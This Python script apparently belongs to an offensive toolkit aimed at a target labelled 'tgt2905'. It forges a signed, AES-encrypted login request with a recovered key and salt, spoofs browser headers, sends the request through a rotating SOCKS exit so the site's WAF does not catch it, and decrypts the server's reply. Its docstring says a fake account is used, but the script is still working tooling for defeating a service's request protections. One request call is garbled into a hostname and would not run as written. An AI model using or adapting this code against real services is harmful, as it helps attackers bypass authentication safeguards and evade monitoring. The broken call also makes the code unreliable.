#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Single validation request against the tgt2905 login endpoint through a FRESH exit (VPS socks).

Purpose: prove the recovered STATICAES envelope (AES key + salt + X-Signature + transforms)
is ACCEPTED by the server. Uses a NON-EXISTENT account, so no password guessing against any
real account occurs and no lockout can be triggered.

Discipline: exactly one POST, >=3s spacing, stop immediately on a WAF block page.
"""
import base64
import hashlib
import json
import sys
import time

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

sys.path.insert(0, r"C:\rt\dgha")
import tgt2905_recipe as R

HOST = "https://example.com"
EP = "/member/memberManager/loginV3"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/203.0.113.20 Safari/537.36")
DEVICE = "0b6fe9dd0ec1f7848f3c17c2707d4ff7"

PROXY = sys.argv[1] if len(sys.argv) > 1 else "socks5h://127.0.0.1:11080"
ACCOUNT = sys.argv[2] if len(sys.argv) > 2 else "zzz_no_such_account_0001"
PASSWORD = sys.argv[3] if len(sys.argv) > 3 else "zzz_test_pwd_0001"
VALIDCODE = sys.argv[4] if len(sys.argv) > 4 else "1234"


def dec(b64):
    ct = base64.b64decode(b64 + "=" * (-len(b64) % 4))
    pt = AES.new(R.AES_KEY.encode(), AES.MODE_ECB).decrypt(ct)
    try:
        return unpad(pt, 16).decode("utf-8")
    except Exception:
        return pt.decode("utf-8", "replace")


def main():
    payload, plain, body = R.build(ACCOUNT, PASSWORD, VALIDCODE, DEVICE)
    ts = str(int(time.time() * 1000))
    sig = hashlib.md5((ts + R.SALT).encode()).hexdigest()
    hdr = {"Content-Type": "application/json", "Accept": "application/json, text/plain, */*",
           "User-Agent": UA, "X-Timestamp": ts, "X-Signature": sig,
           "Isauthent": ts, "isstep": ts}
    print("=== request ===")
    print("proxy      :", PROXY)
    print("URL        : POST", HOST + EP)
    print("X-Timestamp:", ts)
    print("X-Signature:", sig, "= md5(X-Timestamp + salt)")
    print("payload    :", plain)
    print("body       :", body[:160], "...")
    proxies = {"http": PROXY, "https": PROXY}
    t0 = time.time()
    try:
        r = target9.example.com(HOST + EP, data=body.encode(), headers=hdr, timeout=40, proxies=proxies)
    except Exception as e:
        print("\n[REQUEST FAILED]", e)
        return
    print("\n=== response (%.2fs, http %s) ===" % (time.time() - t0, r.status_code))
    txt = r.text
    if "has been blocked" in txt:
        print("!!! WAF BLOCK page returned -> stop, this exit is flagged")
        print(txt[:300])
        return
    try:
        j = r.json()
    except Exception:
        print("non-JSON:", txt[:400])
        return
    print("raw keys:", list(j.keys()))
    if "status" in j:
        print("PLAINTEXT RESPONSE:", json.dumps(j, ensure_ascii=False))
    else:
        if j.get("AA"):
            print("AA       :", j["AA"])
        if j.get("data"):
            pt = dec(j["data"])
            print("DECRYPTED:", pt)
            try:
                print("PARSED   :", json.dumps(json.loads(pt), ensure_ascii=False))
            except Exception:
                pass
    with open(r"C:\rt\dgha\runs\tgt2905_login_validate.txt", "w", encoding="utf-8") as fh:
        fh.write("request headers: %s\npayload: %s\nbody: %s\n\nresponse http=%s\n%s\n"
                 % (json.dumps(hdr, ensure_ascii=False), plain, body, r.status_code, txt))


if __name__ == "__main__":
    main()
